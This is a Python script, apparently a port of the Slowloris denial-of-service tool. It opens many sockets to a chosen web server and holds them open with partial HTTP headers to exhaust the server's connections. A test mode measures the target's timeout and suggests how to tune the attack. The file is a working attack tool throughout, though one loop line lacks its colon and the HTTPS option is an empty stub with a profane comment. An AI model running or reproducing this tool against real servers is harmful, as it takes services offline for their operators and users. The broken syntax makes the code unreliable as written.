import sys
import time
import random
import socket
import argparse
import threading

sys.stdout.write("""
CCCCCCCCCCOOCCOOOOO888@8@8888OOOOCCOOO888888888@@@@@@@@@8@8@@@@888OOCooocccc::::
CCCCCCCCCCCCCCCOO888@888888OOOCCCOOOO888888888888@88888@@@@@@@888@8OOCCoococc:::
CCCCCCCCCCCCCCOO88@@888888OOOOOOOOOO8888888O88888888O8O8OOO8888@88@@8OOCOOOCoc::
CCCCooooooCCCO88@@8@88@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888@8888OOOCc::::
CooCoCoooCCCO8@88@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc:
ooooooCoCCC88@88888@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88@888OCoccc
ooooCCOO8O888888888@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo
oCCCCCCO8OOOCCCOO88@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC
oCCCCCOOO88OCooCO88@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC
oCCCCOO88OOCCCCOO8@@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888OO
CCCOOOO88OOCCOOO8@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O
CCCOO88888OOCOO8@@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOOO
OOOOOO88888OOOO8@8@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCOOOO
OOOOO888@8@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOOO
COOO888@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO
CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC
coooCCO8@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC
:ccooooCO888OOOO8OOc..:...::. .co8@8Coc::..  ....  ..:cooCooooccccc::::ccooCCooC
.:::coocccoO8OOOOOOC:..::....coCO8@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC
....::::ccccoCCOOOOOCc......:oCO8@8@88OCCCoccccc::c::.:oCcc:::cccc:..::::coooooo
.......::::::::cCCCCCCoocc:cO888@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc
...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:co
.............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo
 ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC
   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:cccco
  .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....:::::ccoocc
       .   .         .. ..::cccc:.::ccoocc:. ........... ..  . ..:::.:::::::ccco
 Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client
""")

parser = argparse.ArgumentParser()
parser.add_argument("-shost", "-s", type=str, required=False)
parser.add_argument("-dns", "-d", dest="host", type=str, required=False)
parser.add_argument("-httpready", action="store_true", required=False)
parser.add_argument("-num", "-n", dest="connections", type=int, required=False)
parser.add_argument("-cache", "-c", action="store_true", required=False)
parser.add_argument("-port", "-p", type=int, required=False)
parser.add_argument("-https", dest="ssl", required=False)
parser.add_argument("-tcpto", type=int, required=False)
parser.add_argument("-test", action="store_true", required=False)
parser.add_argument("-timeout", type=int, required=False)
parser.add_argument("-version", "-v", action="store_true", required=False)

args = parser.parse_args()

if args.version:
	sys.exit("Version 0.1")

if not args.host:
	print("Usage:\n\n\tpython {} -dns [www.example.com] -options".format(sys.argv[0]))
	print("\n\tType 'pydoc {}' for help with options.\n".format(sys.argv[0]))
	sys.exit()

if not args.port:
	args.port = 80
	print("Defaulting to port 80.")

if not args.tcpto:
	args.tcpto = 5
	print("Defaulting to a 5 second tcp connection timeout.")

if not args.test:
	if not args.timeout:
		args.timeout = 100
		print("Defaulting to a 100 second re-try timeout.")
	if not args.connections:
		args.connections = 1000
		print("Defaulting to 1000 connections.")

failed = 0
packetcount = 0

if args.shost:
	sendhost = args.shost
else:
	sendhost = args.host

if args.httpready:
	method = "POST"
else:
	method = "GET"

def doconnections():
	global failed, packetcount

	sock = []
	working = [0 for i in range(50)]

	while True:
		failedconnections = 0
		print("\t\tBuilding sockets.");
		for i in range(50):
			if not working[i]:
				sock.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
				sock[i].settimeout(args.tcpto)

				if args.ssl:
					pass
					# God damn it, get on with it already! Dumb fucking moron.

				try:
					if sock[i].connect_ex((args.host, args.port)) == 0:
						working[i] = 1
						packetcount += 3
					
					if working[i]:
						if args.cache:
							rand = "?" + str(random.randint(0, 99999999999999))
						else:
							rand = ""

						primarypayload = method + " /" + rand + " HTTP/1.1\r\n"
						primarypayload += "Host: " + sendhost + "\r\n"
						primarypayload += "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
						primarypayload += "Content-Length: 42\r\n"

						handle = sock[i]
						
						if handle:
							try:
								handle.send(primarypayload.encode("utf-8"))
								packetcount += 1
							except socket.error:
								working[i] = 0
								handle.close()
								failed += 1
								failedconnections += 1
						else:
							working[i] = 0
							failed += 1
							failedconnections += 1
					else:
						working[i] = 0
						failed += 1
						failedconnections += 1
				except socket.error:
					pass

		print("\t\tSending data.")
		for i in range(50):
			if working[i]:
				if sock[i]:
					handle = sock[i]
					try:
						if handle.send(b"X-a: b\r\n"):
							working[i] = 1
							packetcount += 1
						else:
							working[i] = 0
							failed += 1
							failedconnections += 1
					except socket.error:
						pass
				else:
					working[i] = 0
					failed += 1
					failedconnections += 1
		print("Current stats:\tSlowloris has now sent {} packets successfully.\nThis thread now sleeping for {} seconds...\n".format(packetcount, args.timeout))
		time.sleep(args.timeout)

def domultithreading(num):
	num //= 50

	if num > 0:
		for i in range(num):
			thread = threading.Thread(target=doconnections, daemon=True)
			thread.start()

		thread.join()
	else:
		sys.exit("Failed to connect. {} is not enough sockets.".format(args.connections))

if args.test:
	times = [2, 30, 90, 240, 500]
	
	total_time = round(sum(times) / 60, 2)

	print("This test could take up to {} minutes.".format(total_time))

	working = 0

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.settimeout(args.tcpto)

	if args.ssl:
		pass
		# God damn it, get on with it already! Dumb fucking moron.

	if sock.connect_ex((args.host, args.port)) == 0:
		working = 1

	if working:
		if args.cache:
			rand = "?" + str(random.randint(0, 99999999999999))
		else:
			rand = ""

		primarypayload = "GET /" + rand + " HTTP/1.1\r\n"
		primarypayload += "Host: " + sendhost + "\r\n"
		primarypayload += "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
		primarypayload += "Content-Length: 42\r\n"

		try:
			if sock.send(primarypayload.encode("utf-8")):
				print("Connection successful, now comes the waiting game...")
			else:
				print("That's odd - I connected but couldn't send the data to {}:{}.".format(args.host, args.port))
				print("Is something wrong?\nDying.")
				sys.exit()
		except socket.error:
			pass
	else:
		print("Uhm... I can't connect to {}:{}.".format(args.host, args.port))
		print("Is something wrong?\nDying.")
		sys.exit()

	try:
		for i, delay in enumerate(times)
			print("Trying a {} second delay: ".format(delay))

			time.sleep(delay)

			if sock.send(b"X-a: b\r\n"):
				print("\tWorked.")
			else:
				print("\tFailed after {} seconds.".format(delay))
				delay = times[i-1]
				break

		if sock.send(b"Connection: Close\r\n\r\n"):
			print("Okay that's enough time. Slowloris closed the socket.")
		else:
			print("Remote server closed socket.")
			
		print("Use {} seconds for -timeout.".format(delay))
	except socket.error:
		pass

	if delay < 166:
		print("""
		Since the timeout ended up being so small ({} seconds) and it generally 
		takes between 200-500 threads for most servers and assuming any latency at 
		all...  you might have trouble using Slowloris against this target.  You can 
		tweak the -timeout flag down to less than 10 seconds but it still may not 
		build the sockets in time.
		""".format(delay))
else:
	print("Connecting to {}:{} every {} seconds with {} sockets:".format(args.host, args.port, args.timeout, args.connections))
	domultithreading(args.connections)
